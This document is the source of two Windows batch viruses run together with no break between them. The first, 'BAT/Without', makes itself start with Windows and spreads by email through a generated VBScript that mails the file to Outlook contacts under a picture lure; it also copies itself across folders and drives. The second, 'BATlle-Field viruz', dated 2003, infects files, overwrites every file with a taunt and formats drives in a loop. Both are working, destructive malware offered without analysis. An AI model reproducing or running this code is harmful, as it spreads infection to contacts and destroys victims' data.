@echo off
REM BAT/Without.c
REM by McHit
:AutoSt
copy %0 %WinDir%\Startm~1\Progra~1\Autost~1\WinStart.bat

:Worming
:eMailWorming

copy %0 C:\Without.bat
copy %0 C:\send.vbs 
echo Dim x > C:\send.vbs
echo.on error resume next >> C:\send.vbs

echo Set so=CreateObject("Scripting.FileSystemObject") >> C:\send.vbs
echo Set ol=CreateObject("Outlook.Application") >> C:\send.vbs
echo For x=1 To 50 >> C:\send.vbs
echo Set Mail=ol.CreateItem(0) >> C:\send.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\send.vbs
echo Mail.Subject="Hi!!" >> C:\send.vbs
echo Mail.Body="Hi! Guck dir mal das kranke Bild an! ;-)" >> C:\send.vbs
echo Mail.Attachments.Add("C:\without.bat") >> C:\send.vbs
echo Mail.Send >> C:\send.vbs
echo Next >> C:\send.vbs
echo ol.Quit >> C:\send.vbs
cscript C:\send.vbs //B

:ComputerWorming
copy %0 %WinDir%\Desktop\*.bat
copy %0 C:\*.bat
cd..
copy %0 *.bat
cd..
copy %0 *.bat
cd..
copy %0 *.bat
cd..
copy %0 *.bat


:DiskWorming
copy %0 A:\*.bat
copy %0 D:\*.bat
copy %0 E:\*.bat
ctty CON:: °±²Û BATlle-Field viruz by Ratty and DvL Û²±°
::      ===================================
:: 14.05.2003
:: Created by 2 good friends reunited
:: DvL      ( dvl2003ro@yahoo.co.uk )
:: Ratty    ( ratty2001ro@yahoo.com )
:: Contact us.
:: GreetZ <-- VX GuyZ : SpTh  --> www.spth.de.vu        --> working
:: ======     =======   Ratty --> http://ratty.home.ro/ --> work in progress
::        <-- Av GuyZ : Adder --> www.bitdefender.com   --> working
::            =======   Kav   --> www.kaspersky.com     --> working
::        <-- Misc    : NgL   --> my girlfriend
::            ====      MJ    --> my BEST friend
@echo off
ctty nul
ver | find "XP"
if errorlevel 1 goto w1nd0z3
if not errorlevel 1 goto :XP
:XP
for /r \ %%i in (*.*) do copy %%i+%0 %%i
:: The next line is unuseful :)
for /r \ %%i in (*.*) do echo DvL and Ratty killed your DATA > %%i
if exist echo y | format e:
if exist echo y | format d:
goto XP
ctty con
exit
:w1nd0z3
@for %%a in (*.exe, *.bat) do copy %%a+%0 %%a
@if exist echo y | format e:/q/autotest
@if exist echo y | format d:/q/autotest
goto w1nd0z3
:: BATlle-Field viruz by Ratty and DvL
:: 14.05.2003
ctty con
cls